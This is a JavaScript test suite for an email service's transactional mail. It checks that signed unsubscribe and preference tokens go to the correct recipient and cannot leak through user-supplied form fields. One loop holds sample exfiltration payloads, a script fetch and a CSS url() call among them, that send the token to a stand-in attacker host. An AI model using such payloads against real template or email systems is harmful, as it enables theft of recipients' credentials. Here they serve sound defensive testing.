import assert from 'node:assert/strict';
import test from 'node:test';
import Mailgun from 'mailgun.js';

// All credentials are deliberately synthetic. The isolated runner remains the
// fail-closed network boundary; only the Mailgun transport is replaced.
process.env.SUPABASE_URL = 'https://transactional-tests.invalid';
process.env.SUPABASE_SERVICE_KEY = 'transactional-test-key';
process.env.MAILGUN_API_KEY = 'transactional-test-key';
process.env.EMAIL_PREFERENCES_TOKEN_SECRET = 'transactional-test-signing-secret';

const deliveries = [];
const originalClient = Mailgun.prototype.client;
Mailgun.prototype.client = function () {
  return { messages: { create: async (domain, payload) => {
    deliveries.push({ domain, ...structuredClone(payload) });
    return { id: `mock-delivery-${deliveries.length}` };
  } } };
};

const { supabase } = await import('./database.js');
const { sendEmail, clearTenantEmailCache } = await import('./emailService.js');
const { executeConfirmedWorkflow } = await import('./workflows.js');
const { sendSubmissionEmails } = await import('./formSubmissionEmails.js');
const { default: testSend } = await import('../email-templates/test-send.js');
const { generateMemberPreferencesToken } = await import('../email-preferences/index.js');

const tenantId = 'tenant-transactional';
const member = { id: 'recipient-one', tenant_id: tenantId, email: 'one@example.test', first_name: 'One', organization_id: 'org-one', role_id: 'role-one' };
const other = { ...member, id: 'recipient-two', email: 'two@example.test', first_name: 'Two' };
const foreign = { ...member, id: 'foreign-recipient', tenant_id: 'tenant-foreign', organization_id: 'foreign-org', email: 'foreign@example.test' };
const body = '<p>Body {{unsubscribe_link}} / {{UNSUBSCRIBE_LINK}}</p><a href="{{unsubscribe_url}}">Visual unsubscribe</a>';
const footer = '<p>Footer {{unsubscribe_link}} <a href="{{UNSUBSCRIBE_URL}}">Footer preferences</a></p>';
let workflowConfig;
let templateBody = body;
let queries = [];
const originalFrom = supabase.from;

function from(table) {
  const filters = [];
  const query = {
    select() { return this; },
    eq(key, value) { filters.push([key, value]); return this; },
    ilike(key, value) { filters.push([key, value]); return this; },
    in(key, values) { filters.push([key, values]); return this; },
    not() { return this; }, is() { return this; }, order() { return this; }, limit() { return this; },
    insert() { return this; }, update() { return this; },
    single() { return Promise.resolve(result(true)); },
    maybeSingle() { return Promise.resolve(result(true)); },
    then(resolve, reject) { return Promise.resolve(result(false)).then(resolve, reject); },
  };
  function result(single) {
    queries.push({ table, filters: [...filters] });
    let rows = [];
    if (table === 'tenant') rows = [{ id: tenantId, name: 'Transactional test', slug: 'transactional-test', status: 'active', settings: {} }];
    if (table === 'member') rows = [member, other, foreign];
    if (table === 'organization') rows = [{ id: 'org-one', tenant_id: tenantId, name: 'Test organization' }];
    if (table === 'email_template') rows = [{ id: 'template-one', tenant_id: tenantId, subject: 'Transactional message', body: templateBody, is_active: true }];
    if (table === 'workflow') rows = [{ id: 'workflow-one', tenant_id: tenantId, name: 'Transactional test', is_active: true, actions: [{ type: 'send_email', config: workflowConfig }] }];
    if (table === 'system_settings') rows = [{ tenant_id: tenantId, setting_key: 'email_footer_html', setting_value: footer }];
    rows = rows.filter(row => filters.every(([key, value]) => Array.isArray(value)
      ? value.includes(row[key])
      : String(row[key] ?? '').toLowerCase() === String(value).toLowerCase()));
    return { data: single ? rows[0] || null : rows, error: null };
  }
  return query;
}

test.beforeEach(() => {
  deliveries.length = 0;
  queries = [];
  templateBody = body;
  supabase.from = from;
  clearTenantEmailCache(tenantId);
  workflowConfig = { mode: 'template', template_id: 'template-one', to: other.email, field_mappings: { unsubscribe_link: 'core:first_name', UNSUBSCRIBE_URL: 'core:email' } };
});
test.after(() => {
  supabase.from = originalFrom;
  Mailgun.prototype.client = originalClient;
});

function assertRendered(payload, recipient = null) {
  assert.ok(payload, 'actual Mailgun messages.create was reached');
  assert.doesNotMatch(payload.html + payload.text, /\{\{\s*(?:unsubscribe|communication_preferences)_(?:link|url)\s*\}\}/i);
  assert.doesNotMatch(payload.html, /href\s*=\s*["']\s*["']/i);
  assert.match(payload.html, /Footer/);
  assert.equal(payload['h:List-Unsubscribe'], undefined, 'transactional mail must not opt into campaign headers');
  if (recipient) {
    const token = generateMemberPreferencesToken(tenantId, recipient.id);
    assert.ok(payload.html.includes(`/email-preferences?t=${token}`), 'HTML uses actual recipient identity');
    assert.ok(payload.text.includes(`/email-preferences?t=${token}`), 'plain text retains a usable URL');
    assert.match(payload.html, /<a\b[^>]*>Unsubscribe<\/a>/i);
    const urls = [...payload.html.matchAll(/https?:\/\/[^"'<\s]+\/email-preferences\?t=([^"'<\s]+)/g)];
    assert.ok(urls.length >= 4, 'body repeats, visual element, and appended footer all resolve');
    for (const [url, value] of urls) {
      assert.equal(value, token);
      assert.equal(new URL(url).origin, `https://transactional-test.${process.env.APP_DOMAIN || 'iconn.app'}`);
    }
  } else {
    assert.doesNotMatch(payload.html + payload.text, /\/email-preferences\?t=/);
    assert.doesNotMatch(payload.html, /<a\b[^>]*>\s*(?:Unsubscribe|Visual unsubscribe|Footer preferences)\s*<\/a>/i);
  }
}

test('actual direct workflow binds body and configured footer to delivery recipient, not trigger member', async () => {
  const result = await executeConfirmedWorkflow('workflow-one', 'member', member.id, null, member, 'https://untrusted-request.invalid');
  assert.equal(result.success, true);
  assert.equal(deliveries.length, 1);
  assertRendered(deliveries[0], other);
  assert.doesNotMatch(deliveries[0].html, /untrusted-request\.invalid\/email-preferences/);
});

test('actual role workflow creates separate recipient-specific body and footer payloads', async () => {
  workflowConfig = { ...workflowConfig, to_mode: 'role', to_role_ids: ['role-one'] };
  const result = await executeConfirmedWorkflow('workflow-one', 'organization', 'org-one', null, { id: 'org-one', tenant_id: tenantId }, 'https://transactional-test.iconn.app');
  assert.equal(result.success, true);
  assert.equal(deliveries.length, 2);
  const localDeliveries = deliveries.filter(payload => [member.email, other.email].includes(payload.to[0]));
  assert.equal(localDeliveries.length, 2);
  for (const recipient of [member, other]) assertRendered(localDeliveries.find(payload => payload.to[0] === recipient.email), recipient);
});

test('actual configured form send uses the addressee instead of the created/submitting member', async () => {
  const result = await sendSubmissionEmails({
    supabase,
    form: {
      id: 'form-one', tenant_id: tenantId,
      fields: [{ id: 'unsubscribe_link', label: 'UNSUBSCRIBE_URL', type: 'text' }],
      submission_emails: [{
        id: 'email-one', template_id: 'template-one', recipient: other.email,
        field_mapping: { unsubscribe_link: 'unsubscribe_link', UNSUBSCRIBE_URL: 'unsubscribe_link' },
      }],
    },
    formValues: { unsubscribe_link: 'https://attacker.invalid/preferences' },
    createdMemberId: member.id, baseUrl: 'https://untrusted-request.invalid',
  });
  assert.equal(result.success, true);
  assert.equal(deliveries.length, 1);
  assertRendered(deliveries[0], other);
  assert.doesNotMatch(deliveries[0].html + deliveries[0].text, /attacker\.invalid/);
});

for (const [context, maliciousValue] of [
  ['stylesheet', '<style>.leak { background: url("https://attacker.invalid/collect?secret={{unsubscribe_url}}"); }</style>'],
  ['script', '<script>fetch("https://attacker.invalid/collect?secret={{unsubscribe_url}}")</script>'],
  ['textarea', '<textarea>https://attacker.invalid/collect?secret={{unsubscribe_url}}</textarea>'],
  ['title', '<title>https://attacker.invalid/collect?secret={{unsubscribe_url}}</title>'],
  ['prefixed URL text', '<p>https://attacker.invalid/collect?secret={{unsubscribe_url}}</p>'],
  ['prefixed link text', '<p>https://attacker.invalid/collect?secret={{unsubscribe_link}}</p>'],
]) {
  test(`actual form-field substitution cannot leak signed preference credentials through ${context}`, async () => {
    // This is an ordinary editable field, NOT a reserved field name. Its value
    // is interpolated by the actual form renderer before the final resolver.
    templateBody = `ATTACK_BEGIN{{comments}}ATTACK_END${body}`;
    const result = await sendSubmissionEmails({
      supabase,
      form: {
        id: 'form-one', tenant_id: tenantId,
        fields: [{ id: 'comments', label: 'Comments', type: 'text' }],
        submission_emails: [{ id: 'email-one', template_id: 'template-one', recipient: other.email }],
      },
      formValues: { comments: maliciousValue },
      createdMemberId: member.id,
    });
    assert.equal(result.success, true);
    assert.equal(deliveries.length, 1);
    const payload = deliveries[0];
    assertRendered(payload, other);
    for (const format of ['html', 'text']) {
      const attack = payload[format].match(/ATTACK_BEGIN([\s\S]*?)ATTACK_END/);
      assert.ok(attack, `${format} retains the field region markers`);
      assert.doesNotMatch(attack[1], /\/email-preferences\?t=/, `${format} attacker-controlled context cannot obtain a preference URL`);
      for (const recipient of [member, other, foreign]) {
        assert.ok(!attack[1].includes(generateMemberPreferencesToken(recipient.tenant_id, recipient.id)),
          `${format} attacker-controlled context contains no signed recipient token`);
      }
      assert.doesNotMatch(attack[1], /\{\{\s*(?:unsubscribe|communication_preferences)_(?:link|url)\s*\}\}/i);
    }
    assert.match(payload.html, /attacker\.invalid/, 'fixture reaches the final transport instead of being silently omitted');
  });
}

for (const email of [other.email, 'guest@example.test', foreign.email]) {
  test(`actual template test-send safely handles sample-member mismatch for ${email}`, async () => {
    const response = { code: 200, status(code) { this.code = code; return this; }, json(value) { this.value = value; return this; } };
    await testSend({ method: 'POST', headers: { host: 'transactional-test.iconn.app' }, query: {}, body: { templateId: 'template-one', memberId: member.id, email } }, response);
    assert.equal(response.code, 200, JSON.stringify(response.value));
    assert.equal(deliveries.length, 1);
    assertRendered(deliveries[0], email === other.email ? other : null);
    assert.ok(queries.filter(q => q.table === 'member').some(q => q.filters.some(([key, value]) => key === 'tenant_id' && value === tenantId)));
  });
}

for (const extra of [{ to: [member.email, other.email] }, { to: `${member.email}, ${other.email}` }, { to: member.email, cc: other.email }, { to: member.email, bcc: other.email }]) {
  test(`final HTML and explicit text fall back safely for multi-address ${JSON.stringify(extra)}`, async () => {
    const result = await sendEmail({ ...extra, tenantId, subject: 'Multi recipient', html: body, text: 'Text {{unsubscribe_link}} and {{UNSUBSCRIBE_URL}}' });
    assert.equal(result.success, true);
    assert.equal(deliveries.length, 1);
    assertRendered(deliveries[0]);
    assert.doesNotMatch(deliveries[0].text, /<a\b/i);
  });
}

test('explicit plain-text aliases resolve as URLs, not HTML anchors', async () => {
  const result = await sendEmail({ to: member.email, tenantId, subject: 'Plain text', html: body, text: 'Text {{unsubscribe_link}} and {{UNSUBSCRIBE_URL}}' });
  assert.equal(result.success, true);
  assertRendered(deliveries[0], member);
  assert.doesNotMatch(deliveries[0].text, /<a\b/i);
});